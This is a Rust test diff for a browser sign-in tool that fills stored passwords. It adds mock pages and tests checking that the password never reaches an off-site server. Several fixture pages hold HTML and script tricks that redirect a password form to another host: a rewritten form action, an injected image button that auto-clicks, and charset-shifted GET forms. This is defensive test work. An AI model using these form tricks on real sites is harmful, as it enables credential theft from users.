@@ -44,8 +44,19 @@ impl General for Recorder {
     }
 }
 
-/// Every request line any rig site was sent: what reached a server.
-static HEARD: Mutex<Vec<String>> = Mutex::new(Vec::new());
+/// Every request any rig site was sent, whole, by the site's port: what
+/// reached a server.
+static HEARD: Mutex<Vec<(u16, String)>> = Mutex::new(Vec::new());
+
+/// Whether the site on `port` was ever sent the password, anywhere in a
+/// request.
+fn heard_password(port: u16) -> bool {
+    HEARD
+        .lock()
+        .unwrap()
+        .iter()
+        .any(|(at, request)| *at == port && request.contains(PASSWORD))
+}
 
 /// A sign-in site: `/login` (username and password), `/totp` (the code),
 /// `/home`, with links out; `/stuck`, whose form never leaves; `/type`, a
@@ -86,10 +97,7 @@ async fn site(off_site: u16) -> u16 {
                 }
                 let text = String::from_utf8_lossy(&request).to_string();
                 let path = text.split_whitespace().nth(1).unwrap_or("/").to_owned();
-                HEARD
-                    .lock()
-                    .unwrap()
-                    .push(text.lines().next().unwrap_or_default().to_owned());
+                HEARD.lock().unwrap().push((port, text.clone()));
                 let cookie = text
                     .lines()
                     .find_map(|line| {
@@ -121,7 +129,7 @@ async fn site(off_site: u16) -> u16 {
                     "/script" => ("200 OK", String::new(), r#"<title>Script</title><div id="app"></div><script>
                         app.innerHTML = '<label>Username <input id="u"></label><label>Password <input id="p" type="password"></label><button id="go">Sign in</button>';
                         go.onclick = () => fetch('/totp', {method: 'POST', body: 'p=' + encodeURIComponent(p.value)});</script>"#.to_owned()),
-                    "/noform-get" => ("200 OK", String::new(), r#"<title>No method</title><form action="/home">
+                    "/noform-get" => ("200 OK", String::new(), r#"<meta charset="utf-8"><title>No method</title><form action="/home">
                         <label>Username <input name="u"></label><label>Password <input name="p" type="password"></label><button>Sign in</button></form>"#.to_owned()),
                     "/grows" => ("200 OK", String::new(), r#"<title>Grows</title><form action="/totp" method="post">
                         <label>Username <input name="u" oninput="if (!this.form.querySelector('button')) this.form.insertAdjacentHTML('beforeend', '<button>Next</button>')"></label></form>"#.to_owned()),
@@ -131,6 +139,19 @@ async fn site(off_site: u16) -> u16 {
                         .catch(e => document.getElementById('r').textContent = 'refused ' + e.name + ' ' + e.message);</script>"#.to_owned()),
                     "/leaky" => ("200 OK", String::new(), format!(r#"<title>Leaky</title>
                         <form action="http://127.0.0.1:{off_site}/form" method="get"><label>Password <input name="p" type="password"></label><button>Sign in</button></form>"#)),
+                    "/latin" => ("200 OK", String::new(), r#"<meta charset="windows-1252"><title>Latin</title><form action="/home">
+                        <label>Password <input name="p" type="password"></label><button>Sign in</button></form>"#.to_owned()),
+                    "/latin-form" => ("200 OK", String::new(), r#"<meta charset="utf-8"><title>Latin form</title><form action="/home" accept-charset="ISO-8859-1">
+                        <label>Password <input name="p" type="password"></label><button>Sign in</button></form>"#.to_owned()),
+                    "/image" => ("200 OK", String::new(), format!(r#"<title>Image</title><form action="/totp" method="post">
+                        <label>Password <input name="p" type="password"></label>
+                        <input type="image" alt="Go" formaction="http://127.0.0.1:{off_site}/form" formtarget="f"></form><iframe name="f"></iframe>"#)),
+                    "/image-later" => ("200 OK", String::new(), format!(r#"<title>Image later</title><form id="f" action="/totp" method="post">
+                        <label>Password <input id="p" name="p" type="password"></label></form><iframe name="t"></iframe><script>
+                        p.addEventListener('input', () => setTimeout(() => {{
+                            f.insertAdjacentHTML('beforeend', '<input type="image" id="go" alt="Go" formaction="http://127.0.0.1:{off_site}/form" formtarget="t">');
+                            go.click();
+                        }}, 300), {{once: true}});</script>"#)),
                     "/turncoat" => ("200 OK", String::new(), format!(r#"<title>Turncoat</title>
                         <form action="/totp" method="post" onsubmit="this.action='http://127.0.0.1:{off_site}/form'; this.method='get'">
                         <label>Password <input name="p" type="password"></label><button>Sign in</button></form>"#)),
@@ -160,6 +181,8 @@ struct Rig {
     signin: Signin,
     general: Recorder,
     port: u16,
+    /// The site `/leaky` and the others send elsewhere: no login's.
+    off_site: u16,
     _root: tempfile::TempDir,
 }
 
@@ -206,6 +229,7 @@ async fn rig(logins: Value) -> Rig {
         signin,
         general,
         port,
+        off_site,
         _root: root,
     }
 }
@@ -1018,10 +1042,9 @@ async fn a_password_sent_off_the_site_never_leaves() {
         rig.general.0.lock().unwrap().is_empty(),
         "nothing went to the general browser"
     );
-    let heard = HEARD.lock().unwrap().clone();
     assert!(
-        heard.iter().all(|line| !line.contains(PASSWORD)),
-        "a server heard the password: {heard:?}"
+        !heard_password(rig.off_site),
+        "the other site heard the password"
     );
     rig.signin.stop().await;
 }
@@ -1229,10 +1252,16 @@ async fn a_password_in_a_get_form_is_typed_but_never_sent_in_an_address() {
         .await
         .unwrap();
     tokio::time::sleep(std::time::Duration::from_millis(800)).await;
+    // The other tests post it to the site's own /totp; no request line, a
+    // GET's address, may carry it.
     let heard = HEARD.lock().unwrap().clone();
     assert!(
-        heard.iter().all(|line| !line.contains(PASSWORD)),
-        "a server heard the password: {heard:?}"
+        heard.iter().all(|(_, request)| !request
+            .lines()
+            .next()
+            .unwrap_or_default()
+            .contains(PASSWORD)),
+        "a server heard the password in an address: {heard:?}"
     );
     let running = rig.signin.browser().await.unwrap();
     let session = rig.signin.lock_tabs().list[0].session.clone();
@@ -1281,6 +1310,64 @@ async fn a_button_the_page_adds_while_typing_keeps_the_fill() {
     assert!(
         shown.contains("value=\"george\"") && shown.contains("Next"),
         "{shown}"
+    );
+    rig.signin.stop().await;
+}
+
+/// The stop knows a value as UTF-8 spells it in an address. A page in
+/// another charset, or a form sending one, would spell it otherwise: its
+/// GET form is refused as before.
+#[tokio::test]
+async fn a_get_form_on_a_page_of_another_charset_is_refused() {
+    if !have_chromium() {
+        return eprintln!("skipped: no chromium");
+    }
+    let _serial = SERIAL.lock().await;
+    let rig = rig(login()).await;
+    for page in ["/latin", "/latin-form"] {
+        rig.browser(json!({"action": "navigate", "url": rig.url(page)}))
+            .await
+            .unwrap();
+        let password = rig.find("Password").await;
+        let refused = rig
+            .browser(json!({"action": "fill", "ref": password, "secret": "SITE.password"}))
+            .await
+            .unwrap_err();
+        assert!(refused.contains("sends by GET"), "{page}: {refused}");
+    }
+    rig.signin.stop().await;
+}
+
+/// An image button is a submit button form.elements never lists: one that
+/// sends the form elsewhere refuses the fill, and one a page adds after the
+/// password is typed, posting into a frame, is stopped before it leaves.
+#[tokio::test]
+async fn an_image_button_never_posts_a_password_elsewhere() {
+    if !have_chromium() {
+        return eprintln!("skipped: no chromium");
+    }
+    let _serial = SERIAL.lock().await;
+    let rig = rig(login()).await;
+    rig.browser(json!({"action": "navigate", "url": rig.url("/image")}))
+        .await
+        .unwrap();
+    let password = rig.find("Password").await;
+    let refused = rig
+        .browser(json!({"action": "fill", "ref": password, "secret": "SITE.password"}))
+        .await
+        .unwrap_err();
+    assert!(refused.contains("sends elsewhere"), "{refused}");
+    rig.browser(json!({"action": "navigate", "url": rig.url("/image-later")}))
+        .await
+        .unwrap();
+    let password = rig.find("Password").await;
+    rig.browser(json!({"action": "fill", "ref": password, "secret": "SITE.password"}))
+        .await
+        .unwrap();
+    tokio::time::sleep(std::time::Duration::from_millis(1500)).await;
+    assert!(
+        !heard_password(rig.off_site),
+        "the frame posted the password to the other site"
     );
     rig.signin.stop().await;
 }
